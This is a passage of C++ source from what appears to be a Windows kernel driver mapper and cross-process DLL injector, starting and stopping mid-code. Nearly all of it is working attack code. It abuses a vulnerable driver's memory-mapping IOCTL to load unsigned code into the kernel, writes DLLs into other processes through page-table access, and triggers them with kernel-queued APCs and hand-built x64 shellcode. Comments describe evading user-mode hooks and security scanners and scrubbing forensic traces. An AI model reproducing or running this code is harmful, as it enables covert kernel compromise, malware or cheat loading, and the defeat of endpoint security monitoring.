        const char* fnName = reinterpret_cast<const char*>(rawImage.data() + nameOff);
        if (_stricmp(fnName, name.c_str()) != 0) {
            continue;
        }
        const WORD ord = ords[i];
        if (ord >= exp->NumberOfFunctions) {
            return 0;
        }
        const DWORD rva = funcs[ord];
        // Forwarded exports point inside the export directory; not callable directly.
        if (rva >= dir.VirtualAddress && rva < dir.VirtualAddress + dir.Size) {
            return 0;
        }
        return rva;
    }
    return 0;
}

static uint64_t MapDriver(AsioProvider& kernel, const std::vector<uint8_t>& rawImage,
                         const MapperOptions& options,
                         bool cleanInit,
                         NTSTATUS& exitCode,
                         uint64_t* outImageBase = nullptr) {
    if (rawImage.size() < sizeof(IMAGE_DOS_HEADER)) {
        std::wcerr << L"[-] Invalid PE image" << std::endl;
        return 0;
    }

    auto* rawBase = const_cast<uint8_t*>(rawImage.data());
    PIMAGE_NT_HEADERS64 nt = GetNtHeaders(rawBase);
    if (!nt || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::wcerr << L"[-] Target is not a valid x64 PE image" << std::endl;
        return 0;
    }

    // DLL mode keeps the PE headers in kernel memory so downstream code can
    // walk the export directory if needed. For drivers we honour the user's
    // DestroyHeader choice (default: skip headers to shrink footprint).
    const bool destroyHeader = options.DestroyHeader && !options.IsDllImage;

    const uint32_t imageSize = nt->OptionalHeader.SizeOfImage;
    void* localImage = VirtualAlloc(nullptr, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!localImage) {
        PrintWin32Error(L"VirtualAlloc(local image)");
        return 0;
    }

    uint64_t realBase = 0;
    uint32_t allocationSize = 0;
    bool success = false;
    uint64_t resultBase = 0;

    do {
        const uint32_t headersToCopy = std::min<uint32_t>(nt->OptionalHeader.SizeOfHeaders, static_cast<uint32_t>(rawImage.size()));
        std::memcpy(localImage, rawImage.data(), headersToCopy);

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
        bool sectionsOk = true;
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) {
                continue;
            }
            if (!section[i].SizeOfRawData) {
                continue;
            }
            if (section[i].PointerToRawData >= rawImage.size()) {
                std::wcerr << L"[-] Section raw pointer is outside the file" << std::endl;
                sectionsOk = false;
                break;
            }

            const uint32_t rawAvailable = static_cast<uint32_t>(rawImage.size() - section[i].PointerToRawData);
            const uint32_t rawSize = std::min<uint32_t>(section[i].SizeOfRawData, rawAvailable);
            if (section[i].VirtualAddress + rawSize > imageSize) {
                std::wcerr << L"[-] Section virtual range is outside the image" << std::endl;
                sectionsOk = false;
                break;
            }

            std::memcpy(
                reinterpret_cast<void*>(reinterpret_cast<uintptr_t>(localImage) + section[i].VirtualAddress),
                rawImage.data() + section[i].PointerToRawData,
                rawSize);
        }
        if (!sectionsOk) {
            break;
        }

        const uint32_t headerVirtualSize = IMAGE_FIRST_SECTION(nt)->VirtualAddress;
        allocationSize = imageSize - (destroyHeader ? headerVirtualSize : 0);
        if (!allocationSize) {
            std::wcerr << L"[-] Invalid allocation size" << std::endl;
            break;
        }

        realBase = kernel.AllocatePool(allocationSize);
        if (!realBase) {
            std::wcerr << L"[-] Failed to allocate kernel pool" << std::endl;
            break;
        }

        uint64_t kernelImageBase = realBase;
        if (destroyHeader) {
            kernelImageBase -= headerVirtualSize;
            std::wcout << L"[+] PE headers skipped: 0x" << std::hex << headerVirtualSize << std::dec << L" bytes" << std::endl;
        }

        std::wcout << L"[+] Kernel allocation: 0x" << std::hex << realBase
                   << L", image base view: 0x" << kernelImageBase << std::dec << std::endl;

        RelocateImageByDelta(GetRelocs(localImage), kernelImageBase - nt->OptionalHeader.ImageBase);
        if (!FixSecurityCookie(localImage, kernelImageBase)) {
            break;
        }
        if (!ResolveImports(kernel, localImage)) {
            break;
        }

        const uint8_t* writeSource = static_cast<uint8_t*>(localImage) + (destroyHeader ? headerVirtualSize : 0);
        if (!kernel.WriteKernelMemory(realBase, writeSource, allocationSize)) {
            std::wcerr << L"[-] Failed to write mapped image to kernel memory" << std::endl;
            break;
        }

        const uint64_t entry = kernelImageBase + nt->OptionalHeader.AddressOfEntryPoint;
        NTSTATUS status = STATUS_SUCCESS;

        if (options.IsDllImage) {
            // R0 DllMain bootstrap. x64 ABI puts the three args in RCX/RDX/R8,
            // matching BOOL DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved).
            // We pass DLL_PROCESS_ATTACH (1) and a NULL reserved pointer.
            std::wcout << L"[+] Calling DllMain (R0): 0x" << std::hex << entry << std::dec << std::endl;
            constexpr uint64_t kDllProcessAttach = 1;
            if (!kernel.CallKernelFunction(&status, entry, kernelImageBase, kDllProcessAttach, static_cast<uint64_t>(0))) {
                std::wcerr << L"[-] DllMain call failed" << std::endl;
                break;
            }
            exitCode = status;
            // DllMain returns BOOL: TRUE on success, FALSE means PROCESS_ATTACH failed.
            std::wcout << L"[+] DllMain returned: " << (status ? L"TRUE" : L"FALSE")
                       << L" (0x" << std::hex << status << std::dec << L")" << std::endl;
            if (!status) {
                std::wcerr << L"[-] DllMain reported FALSE — DLL refused to initialise in R0" << std::endl;
                // Don't break: still let the caller decide whether to free or
                // call exports. The user can interpret the boolean themselves.
            }
        } else {
            std::wcout << L"[+] Calling DriverEntry: 0x" << std::hex << entry << std::dec << std::endl;
            const uint64_t firstParam = options.PassAllocationPtr ? realBase : options.Param1;
            if (!kernel.CallKernelFunction(&status, entry, firstParam, options.Param2)) {
                std::wcerr << L"[-] DriverEntry call failed" << std::endl;
                break;
            }
            exitCode = status;
            std::wcout << L"[+] DriverEntry returned: 0x" << std::hex << status << std::dec << std::endl;
        }

        // Zero INIT section in kernel memory if requested. After the entry
        // routine returns the init code is dead — scrubbing it removes
        // forensic artefacts. Harmless on DLLs that have no .init section.
        if (cleanInit) {
            auto* section = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
                char name[9] = {};
                std::memcpy(name, section[i].Name, 8);
                bool isInit = (_strnicmp(name, ".init", 5) == 0) ||
                              (section[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE);
                if (!isInit || !section[i].Misc.VirtualSize) continue;
                const uint64_t initVa = kernelImageBase + section[i].VirtualAddress;
                std::vector<uint8_t> zeros(section[i].Misc.VirtualSize, 0);
                if (kernel.WriteKernelMemory(initVa, zeros.data(), zeros.size())) {
                    std::wcout << L"[+] Zeroed INIT section in kernel: 0x"
                               << std::hex << section[i].VirtualAddress
                               << L" size 0x" << section[i].Misc.VirtualSize << std::dec << std::endl;
                }
            }
        }

        if (options.FreeAfterEntry && !options.PersistDriver) {
            std::wcout << L"[+] Freeing mapped kernel allocation" << std::endl;
            if (!kernel.FreePool(realBase)) {
                std::wcerr << L"[-] Warning: failed to free mapped kernel allocation" << std::endl;
            }
        }

        if (outImageBase) {
            *outImageBase = kernelImageBase;
        }
        success = true;
        resultBase = realBase;
    } while (false);

    if (!success && realBase) {
        std::wcout << L"[+] Releasing kernel allocation after failure" << std::endl;
        kernel.FreePool(realBase);
    }

    VirtualFree(localImage, 0, MEM_RELEASE);
    return resultBase;
}

// ===================== R3 plumbing for cross-process DLL injection =====================

// Forward decls of the Pure-R0 primitives defined further down — used by
// StageRemoteDll to write/resolve/allocate through the target's CR3 instead
// of NtWriteVirtualMemory / NtReadVirtualMemory / NtQueryInformationProcess
// / NtAllocateVirtualMemory.
static uint64_t ResolveTargetEprocess(AsioProvider& kernel, DWORD pid);
static uint64_t ReadTargetCr3(AsioProvider& kernel, uint64_t eprocess);
static uint64_t ReadTargetPeb(AsioProvider& kernel, uint64_t eprocess);
static bool ReadTargetMem(AsioProvider& kernel, uint64_t cr3, uint64_t va,
                          void* outBuffer, size_t size);
static bool WriteTargetMem(AsioProvider& kernel, uint64_t cr3, uint64_t va,
                           const void* srcBuffer, size_t size);
static bool ResolveImportsViaTargetCr3(AsioProvider& kernel, uint64_t cr3,
                                       uint64_t peb, void* localImage);
static uint64_t AllocateTargetUserMem(AsioProvider& kernel, uint64_t eprocess,
                                      size_t size, uint32_t protect);
//
// Strategy for DLLs that import user-mode APIs (user32!MessageBoxA,
// kernel32!CreateThread, ...): we cannot resolve those imports against
// ntoskrnl, so an R0-only manual map fails. Instead we keep the image
// staging in R3 (VirtualAllocEx + WriteProcessMemory + VirtualProtectEx)
// and trigger DllMain via an APC built and queued in R0 — never calling
// CreateRemoteThread, NtQueueApcThread or any of the obvious user-mode
// "set a thread running in another process" syscalls. The kernel APC
// path uses our existing NtAddAtom-SSDT hook to invoke
// ntoskrnl!PsLookupThreadByThreadId and ntoskrnl!KeInsertQueueApc.

struct RemoteMappedDll {
    HANDLE Process = nullptr;
    DWORD Pid = 0;
    void* RemoteBase = nullptr;
    size_t ImageSize = 0;
    uint64_t RuntimeFunctionsVa = 0;
    uint32_t RuntimeFunctionCount = 0;
    std::wstring Path;
};

static DWORD FindProcessIdByName(const std::wstring& name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    DWORD pid = 0;
    if (Process32FirstW(snap, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, name.c_str()) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return pid;
}

// Enumerate all thread IDs owned by a given process. We try queuing the
// APC to each one until insertion succeeds (a thread that is alertable
// or that the dispatcher accepts).
static std::vector<DWORD> EnumerateProcessThreads(DWORD pid) {
    std::vector<DWORD> tids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return tids;
    }
    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tids.push_back(te.th32ThreadID);
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tids;
}

static bool GetRemoteModuleBase(HANDLE process, const std::string& moduleName, uint64_t& outBase) {
    HMODULE modules[1024];
    DWORD needed = 0;
    if (!EnumProcessModulesEx(process, modules, sizeof(modules), &needed, LIST_MODULES_ALL)) {
        PrintWin32Error(L"EnumProcessModulesEx");
        return false;
    }

    const DWORD count = needed / sizeof(HMODULE);
    char nameBuffer[MAX_PATH]{};
    for (DWORD i = 0; i < count; ++i) {
        DWORD written = GetModuleBaseNameA(process, modules[i], nameBuffer, MAX_PATH);
        if (!written) {
            continue;
        }
        if (_stricmp(nameBuffer, moduleName.c_str()) == 0) {
            outBase = reinterpret_cast<uint64_t>(modules[i]);
            return true;
        }
    }
    return false;
}

// Read a remote module's export and resolve a function RVA, returning absolute remote address.
// Handles forwarded exports by recursively chasing "TargetModule.FunctionName" strings.
static uint64_t GetRemoteModuleExport(HANDLE process, uint64_t moduleBase, const std::string& functionName, int depth = 0) {
    if (!moduleBase || depth > 8) return 0;

    IMAGE_DOS_HEADER dos{};
    SIZE_T read = 0;
    if (!ReadProcessMemory(process, reinterpret_cast<LPCVOID>(moduleBase), &dos, sizeof(dos), &read) ||
        dos.e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }
    IMAGE_NT_HEADERS64 nt{};
    if (!ReadProcessMemory(process, reinterpret_cast<LPCVOID>(moduleBase + dos.e_lfanew), &nt, sizeof(nt), &read) ||
        nt.Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    const auto& dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) {
        return 0;
    }

    std::vector<uint8_t> blob(dir.Size);
    if (!ReadProcessMemory(process, reinterpret_cast<LPCVOID>(moduleBase + dir.VirtualAddress), blob.data(), blob.size(), &read)) {
        return 0;
    }

    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(blob.data());
    auto rvaToPtr = [&](DWORD rva) -> const uint8_t* {
        if (rva < dir.VirtualAddress) return nullptr;
        DWORD offset = rva - dir.VirtualAddress;
        if (offset >= blob.size()) return nullptr;
        return blob.data() + offset;
    };

    auto* names = reinterpret_cast<const DWORD*>(rvaToPtr(exp->AddressOfNames));
    auto* ords = reinterpret_cast<const WORD*>(rvaToPtr(exp->AddressOfNameOrdinals));
    auto* funcs = reinterpret_cast<const DWORD*>(rvaToPtr(exp->AddressOfFunctions));
    if (!names || !ords || !funcs) {
        return 0;
    }

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        auto* name = reinterpret_cast<const char*>(rvaToPtr(names[i]));
        if (!name) continue;
        if (_stricmp(name, functionName.c_str()) != 0) continue;

        const WORD ord = ords[i];
        if (ord >= exp->NumberOfFunctions) return 0;
        const DWORD rva = funcs[ord];

        // Forwarded export: RVA points inside the export directory. The bytes there are
        // an ASCII string "TargetModule.FunctionName" (or "TargetModule.#Ordinal").
        if (rva >= dir.VirtualAddress && rva < dir.VirtualAddress + dir.Size) {
            auto* fwd = reinterpret_cast<const char*>(rvaToPtr(rva));
            if (!fwd) return 0;
            std::string forward(fwd);
            size_t dot = forward.find('.');
            if (dot == std::string::npos) return 0;

            std::string targetModule = forward.substr(0, dot) + ".dll";
            std::string targetFn = forward.substr(dot + 1);
            if (targetFn.empty()) return 0;
            // We do not support ordinal-forwarded resolution remotely.
            if (targetFn[0] == '#') return 0;

            uint64_t targetBase = 0;
            if (!GetRemoteModuleBase(process, targetModule, targetBase)) {
                return 0;
            }
            return GetRemoteModuleExport(process, targetBase, targetFn, depth + 1);
        }

        return moduleBase + rva;
    }
    return 0;
}

static bool ResolveImportsRemote(HANDLE process, void* localImage) {
    const auto imports = GetImports(localImage);
    for (const auto& imp : imports) {
        uint64_t remoteModBase = 0;
        if (!GetRemoteModuleBase(process, imp.ModuleName, remoteModBase)) {
            std::cerr << "[-] Target process missing dependency: " << imp.ModuleName << std::endl;
            return false;
        }
        for (const auto& fn : imp.Functions) {
            if (fn.ByOrdinal) {
                std::cerr << "[-] Ordinal import unsupported: " << imp.ModuleName << " #" << fn.Ordinal << std::endl;
                return false;
            }
            uint64_t addr = GetRemoteModuleExport(process, remoteModBase, fn.Name);
            if (!addr) {
                std::cerr << "[-] Failed to resolve remote import " << fn.Name << " from " << imp.ModuleName << std::endl;
                return false;
            }
            *fn.Address = addr;
        }
    }
    return true;
}

static DWORD SectionCharacteristicsToProtection(DWORD characteristics) {
    const bool executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    const bool readable = (characteristics & IMAGE_SCN_MEM_READ) != 0;
    const bool writable = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

    DWORD protection = PAGE_NOACCESS;
    if (executable) {
        if (writable) {
            protection = PAGE_EXECUTE_READWRITE;
        } else if (readable) {
            protection = PAGE_EXECUTE_READ;
        } else {
            protection = PAGE_EXECUTE;
        }
    } else {
        if (writable) {
            protection = PAGE_READWRITE;
        } else if (readable) {
            protection = PAGE_READONLY;
        }
    }

    if ((characteristics & IMAGE_SCN_MEM_NOT_CACHED) && protection != PAGE_NOACCESS) {
        protection |= PAGE_NOCACHE;
    }

    return protection;
}

static bool ProtectRemoteDllSections(HANDLE process, void* remoteBase, void* localImage) {
    PIMAGE_NT_HEADERS64 nt = GetNtHeaders(localImage);
    if (!nt) return false;

    DWORD oldProtect = 0;
    auto* section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        const SIZE_T sectionSize = section[i].Misc.VirtualSize ? section[i].Misc.VirtualSize : section[i].SizeOfRawData;
        if (!sectionSize) continue;
        void* sectionBase = static_cast<uint8_t*>(remoteBase) + section[i].VirtualAddress;
        DWORD prot = SectionCharacteristicsToProtection(section[i].Characteristics);
        if (!VirtualProtectEx(process, sectionBase, sectionSize, prot, &oldProtect)) {
            PrintWin32Error(L"VirtualProtectEx(section)");
            return false;
        }
    }
    return true;
}

// Stage a DLL inside a remote user-mode process and return its base.
//
// Pure-R0 path: zero handles, zero R3 syscalls into the target.
//   - allocation via Phase 3 (KeStackAttachProcess + ZwAllocateVirtualMemory
//     called with PreviousMode == KernelMode, returning RWX memory)
//   - import resolution via Phase 2 (PEB→Ldr walk through target CR3)
//   - image write via Phase 1 (WriteTargetMem → target CR3 → physical mem
//     → AsIO64 MAPMEM IOCTL)
// Because the allocation is already RWX, no NtProtectVirtualMemory pass is
// needed afterwards. The whole sequence is invisible to NtOpenProcess /
// NtAllocateVirtualMemory / NtWriteVirtualMemory / NtProtectVirtualMemory
// hooks that watch (PreviousMode == UserMode).
// Forward decl: defined further down. Used by StageRemoteDll to bypass the
// CR3-PTE walker on freshly R0-allocated demand-zero pages.
static bool WriteTargetMemViaMdl(AsioProvider& kernel, uint64_t eprocess, uint64_t cr3,
                                 uint64_t va, const void* inBuffer, size_t size);

// Forward decl: attached-memcpy write helper. Writes user VAs from kernel
// context by KeStackAttachProcess + memcpy. The OS page-fault handler
// (MiUserFault/KiPageFault) materializes demand-zero pages naturally — no
// MmProbeAndLockPages, no raise to caller. Used by StageRemoteDll to
// deliver the manual-mapped image to the freshly R0-allocated buffer.
static bool WriteTargetMemViaAttachedMemcpy(AsioProvider& kernel, uint64_t eprocess,
                                            uint64_t destVa, const void* srcBytes,
                                            size_t size);

static uint64_t ResolveTargetModuleBase(AsioProvider& kernel, uint64_t cr3,
                                        uint64_t peb, const std::string& moduleName);
static uint64_t ResolveTargetExport(AsioProvider& kernel, uint64_t cr3,
                                    uint64_t peb, uint64_t moduleBase,
                                    const std::string& functionName, int depth);

// Thread-local target eprocess hint for PEB-walk reads (see definition
// of ReadTargetMemPreferMdl further below). Declared early so RAII helper
// is usable from StageRemoteDll.
static thread_local uint64_t t_pebWalkEprocess;
struct TargetEprocessScope {
    uint64_t prev;
    explicit TargetEprocessScope(uint64_t eproc) : prev(t_pebWalkEprocess) {
        t_pebWalkEprocess = eproc;
    }
    ~TargetEprocessScope() { t_pebWalkEprocess = prev; }
};

static bool StageRemoteDll(AsioProvider& kernel, uint64_t targetEprocess,
                           uint64_t targetCr3, uint64_t targetPeb,
                           const std::vector<uint8_t>& rawImage,
                           RemoteMappedDll& out, uint64_t& outDllMainVa) {
    outDllMainVa = 0;
    auto* rawBase = const_cast<uint8_t*>(rawImage.data());
    PIMAGE_NT_HEADERS64 nt = GetNtHeaders(rawBase);
    if (!nt || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::wcerr << L"[-] Inject mode supports x64 PE images only" << std::endl;
        return false;
    }
    if ((nt->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) {
        std::wcerr << L"[-] Target PE is not marked as a DLL" << std::endl;
        return false;
    }

    const SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    // One extra page after the image holds the once-only trampoline +
    // control block (see WriteOnceTrampoline below). APC.NormalRoutine
    // jumps into the trampoline instead of DllMain directly; only the
    // first APC delivery wins a `lock cmpxchg` and tail-calls DllMain.
    // All later deliveries return TRUE without re-entering DllMain.
    constexpr SIZE_T kTrampolinePageSize = 0x1000;
    const SIZE_T allocSize = imageSize + kTrampolinePageSize;

    // Allocate RWX user-mode memory in the target via the R0 shellcode.
    constexpr uint32_t kPageExecuteReadWrite = 0x40;
    const uint64_t remoteBase = AllocateTargetUserMem(kernel, targetEprocess, allocSize, kPageExecuteReadWrite);
    if (!remoteBase) {
        std::wcerr << L"[-] AllocateTargetUserMem failed; image not staged" << std::endl;
        return false;
    }

    void* localImage = VirtualAlloc(nullptr, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!localImage) {
        PrintWin32Error(L"VirtualAlloc(local staging)");
        // Leak the target allocation on this rare failure — see comment below.
        return false;
    }

    bool ok = false;
    do {
        std::memcpy(localImage, rawImage.data(), nt->OptionalHeader.SizeOfHeaders);
        PIMAGE_NT_HEADERS64 localNt = GetNtHeaders(localImage);
        if (!localNt) break;

        auto* section = IMAGE_FIRST_SECTION(localNt);
        bool sectionsOk = true;
        for (WORD i = 0; i < localNt->FileHeader.NumberOfSections; ++i) {
            if (!section[i].SizeOfRawData) continue;
            if (section[i].PointerToRawData >= rawImage.size()) { sectionsOk = false; break; }
            const uint32_t rawAvail = static_cast<uint32_t>(rawImage.size() - section[i].PointerToRawData);
            const uint32_t rawSize = std::min<uint32_t>(section[i].SizeOfRawData, rawAvail);
            if (section[i].VirtualAddress + rawSize > imageSize) { sectionsOk = false; break; }
            std::memcpy(static_cast<uint8_t*>(localImage) + section[i].VirtualAddress,
                        rawImage.data() + section[i].PointerToRawData, rawSize);
        }
        if (!sectionsOk) break;

        const uint64_t delta = remoteBase - localNt->OptionalHeader.ImageBase;
        if (delta) {
            RelocateImageByDelta(GetRelocs(localImage), delta);
        }

        TargetEprocessScope _epScope(targetEprocess);
        if (!ResolveImportsViaTargetCr3(kernel, targetCr3, targetPeb, localImage)) {
            std::wcerr << L"[-] R0 import resolution via target CR3 failed" << std::endl;
            break;
        }

        std::wcout << L"[+] Writing image via AttachedMemcpy (kernel page-fault handler)..." << std::endl;
        // Use attached-memcpy: KeStackAttachProcess + memcpy in target context.
        // Writing user VAs from kernel context naturally faults pages in via
        // the OS page-fault handler (MiUserFault / KiPageFault) which handles
        // demand-zero / transition / proto / pagefile transparently. Since
        // our allocation's VAD is committed, demand-zero pages are auto-
        // materialized without raising. Replaces both physical CR3 write
        // (failed on freshly-allocated demand-zero pages) and MDL write
        // (raised STATUS_ACCESS_VIOLATION on demand-zero PTEs).
        if (!WriteTargetMemViaAttachedMemcpy(kernel, targetEprocess, remoteBase,
                                             localImage, imageSize)) {
            std::wcerr << L"[-] AttachedMemcpy write failed; image not delivered" << std::endl;
            break;
        }
        std::wcout << L"[+] Image written via AttachedMemcpy: 0x"
                   << std::hex << imageSize << std::dec << L" bytes" << std::endl;

        // Verify the image actually landed. Read back the first 16 bytes
        // and the first 16 bytes at the entry point. If WriteTargetMem
        // silently dropped pages, the dump shows zeros and DllMain would
        // immediately crash on entry.
        {
            uint8_t hdr[16]{};
            uint8_t entryBytes[16]{};
            const uint32_t epRva = localNt->OptionalHeader.AddressOfEntryPoint;
            const bool hdrOk = ReadTargetMem(kernel, targetCr3, remoteBase, hdr, sizeof(hdr));
            const bool entryOk = epRva
                ? ReadTargetMem(kernel, targetCr3, remoteBase + epRva, entryBytes, sizeof(entryBytes))
                : false;
            std::wcout << L"[+] Image readback @ 0x" << std::hex << remoteBase << L": ";
            for (auto b : hdr) std::wcout << std::setw(2) << std::setfill(L'0') << static_cast<int>(b) << L' ';
            std::wcout << std::dec << L"  hdrOk=" << hdrOk << std::endl;
            if (epRva) {
                std::wcout << L"[+] Entry  readback @ 0x" << std::hex << (remoteBase + epRva) << L": ";
                for (auto b : entryBytes) std::wcout << std::setw(2) << std::setfill(L'0') << static_cast<int>(b) << L' ';
                std::wcout << std::dec << L"  entryOk=" << entryOk << std::endl;
            }
            const bool mzOk = hdrOk && hdr[0] == 'M' && hdr[1] == 'Z';
            if (!mzOk) {
                std::wcerr << L"[-] MZ header missing at target VA — image write didn't land" << std::endl;
            }
        }

        // Memory is RWX from AllocateTargetUserMem — skip the per-section
        // NtProtectVirtualMemory pass. RWX is detectable by polling scanners
        // but no real-time hook fires when we don't call NtProtect at all.

        // Build the once-only trampoline page right after the image.
        //
        // Page layout @ (remoteBase + imageSize):
        //   +0x00  uint64_t flag = 0
        //   +0x08  reserved
        //   +0x10  trampoline code (38 bytes)
        //
        // Trampoline code (x64):
        //     31 C0                          xor eax, eax
        //     41 B9 01 00 00 00              mov r9d, 1
        //     F0 4C 0F B1 0D DF FF FF FF     lock cmpxchg qword ptr [rip-0x21], r9
        //     75 0D                          jne  already_fired
        //     49 B9 <imm64 dllMainAbs>       mov  r9, dllMainAbs
        //     41 FF E1                       jmp  r9     ; tail-call DllMain(rcx, rdx, r8)
        //   already_fired:
        //     B8 01 00 00 00                 mov  eax, 1 ; return TRUE
        //     C3                             ret
        //
        // Called with rcx=imageBase, rdx=1, r8=0 from KiUserApcDispatcher,
        // matching DllMain's signature. First thread wins the cmpxchg and
        // tail-calls DllMain; every later APC delivery short-circuits with
        // TRUE and never enters DllMain twice.
        const uint32_t entryRva = localNt->OptionalHeader.AddressOfEntryPoint;
        if (entryRva) {
            const uint64_t dllMainAbs = remoteBase + entryRva;
            const uint64_t trampolinePageVa = remoteBase + imageSize;

            // -------- Collect TLS callbacks (best-effort) --------
            //
            // We intentionally DO NOT call ntdll!LdrpHandleTlsData, do not
            // touch PEB->TlsBitmap, do not write *AddressOfIndex. C++
            // `thread_local` storage will not work, but plain C-style
            // TLS_CALLBACK arrays — the 99% case in game/SDK DLLs — run
            // exactly once on attach, right before DllMain, with the same
            // (hModule, DLL_PROCESS_ATTACH, NULL) signature.
            //
            // After RelocateImageByDelta the TLS directory's
            // AddressOfCallBacks field (and each VA in the callback array)
            // has already been rebased to `remoteBase`.
            constexpr size_t kMaxTlsCallbacks = 30;
            uint64_t tlsCallbacks[kMaxTlsCallbacks + 1]{};
            uint32_t tlsCallbackCount = 0;
            {
                const auto& tlsDir = localNt->OptionalHeader
                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
                if (tlsDir.VirtualAddress &&
                    tlsDir.Size >= sizeof(IMAGE_TLS_DIRECTORY64) &&
                    tlsDir.VirtualAddress + sizeof(IMAGE_TLS_DIRECTORY64) <= imageSize) {
                    auto* tls = reinterpret_cast<IMAGE_TLS_DIRECTORY64*>(
                        static_cast<uint8_t*>(localImage) + tlsDir.VirtualAddress);
                    const uint64_t cbArrVa = tls->AddressOfCallBacks;
                    if (cbArrVa && cbArrVa >= remoteBase &&
                        cbArrVa < remoteBase + imageSize) {
                        const uint64_t cbArrRva = cbArrVa - remoteBase;
                        auto* cbPtr = reinterpret_cast<uint64_t*>(
                            static_cast<uint8_t*>(localImage) + cbArrRva);
                        while (tlsCallbackCount < kMaxTlsCallbacks &&
                               cbArrRva + (tlsCallbackCount + 1) * sizeof(uint64_t) <= imageSize) {
                            const uint64_t va = cbPtr[tlsCallbackCount];
                            if (!va) break;
                            tlsCallbacks[tlsCallbackCount++] = va;
                        }
                    }
                }
            }
            if (tlsCallbackCount) {
                std::wcout << L"[+] TLS callbacks discovered: " << tlsCallbackCount << std::endl;
            }

            // -------- Build trampoline page --------
            //
            // Layout @ trampolinePageVa:
            //   +0x000          uint64_t cmpxchg flag (initial 0)
            //   +0x008..+0x0F8  callback VA list (NULL-terminated), up to 30
            //   +0x100          trampoline code, entry point
            //
            // Code (x64), patched in place from C++:
            //   00: 31 C0                          xor eax, eax
            //   02: 41 B9 01 00 00 00              mov r9d, 1
            //   08: F0 4C 0F B1 0D <rel32>         lock cmpxchg [rip+flag], r9
            //   11: 0F 85 <rel32>                  jne already_fired
            //   17: 4C 8D 15 <rel32>               lea r10, [rip+callbacks]
            //   1E: cb_loop:
            //       49 8B 02                       mov rax, [r10]
            //       48 85 C0                       test rax, rax
            //       74 22                          jz  cb_done             (+34)
            //       48 B9 <imm64 imageBase>        mov rcx, imageBase
            //       BA 01 00 00 00                 mov edx, 1
            //       4D 31 C0                       xor r8, r8
            //       48 83 EC 28                    sub rsp, 0x28
            //       FF D0                          call rax
            //       48 83 C4 28                    add rsp, 0x28
            //       49 83 C2 08                    add r10, 8
            //       EB D6                          jmp cb_loop             (-42)
            //   48: cb_done:
            //       48 B9 <imm64 imageBase>        mov rcx, imageBase
            //       BA 01 00 00 00                 mov edx, 1
            //       4D 31 C0                       xor r8, r8
            //       48 B8 <imm64 dllMainAbs>       mov rax, dllMainAbs
            //       48 83 EC 28                    sub rsp, 0x28
            //       FF D0                          call rax
            //       48 83 C4 28                    add rsp, 0x28
            //       B8 01 00 00 00                 mov eax, 1
            //       C3                             ret
            //   6C: already_fired:
            //       B8 01 00 00 00                 mov eax, 1
            //       C3                             ret
            constexpr uint32_t kCodeOffset      = 0x100;
            constexpr uint32_t kCallbacksOffset = 0x008;
            constexpr uint32_t kFlagOffset      = 0x000;

            uint8_t code[] = {
                /* 00 */ 0x31, 0xC0,
                /* 02 */ 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00,
                /* 08 */ 0xF0, 0x4C, 0x0F, 0xB1, 0x0D, 0,0,0,0,
                /* 11 */ 0x0F, 0x85, 0,0,0,0,
                /* 17 */ 0x4C, 0x8D, 0x15, 0,0,0,0,
                /* 1E */ 0x49, 0x8B, 0x02,
                /* 21 */ 0x48, 0x85, 0xC0,
                /* 24 */ 0x74, 0x22,
                /* 26 */ 0x48, 0xB9, 0,0,0,0,0,0,0,0,
                /* 30 */ 0xBA, 0x01, 0x00, 0x00, 0x00,
                /* 35 */ 0x4D, 0x31, 0xC0,
                /* 38 */ 0x48, 0x83, 0xEC, 0x28,
                /* 3C */ 0xFF, 0xD0,
                /* 3E */ 0x48, 0x83, 0xC4, 0x28,
                /* 42 */ 0x49, 0x83, 0xC2, 0x08,
                /* 46 */ 0xEB, 0xD6,
                /* 48 */ 0x48, 0xB9, 0,0,0,0,0,0,0,0,
                /* 52 */ 0xBA, 0x01, 0x00, 0x00, 0x00,
                /* 57 */ 0x4D, 0x31, 0xC0,
                /* 5A */ 0x48, 0xB8, 0,0,0,0,0,0,0,0,
                /* 64 */ 0x48, 0x83, 0xEC, 0x28,
                /* 68 */ 0xFF, 0xD0,
                /* 6A */ 0x48, 0x83, 0xC4, 0x28,
                /* 6E */ 0xB8, 0x01, 0x00, 0x00, 0x00,
                /* 73 */ 0xC3,
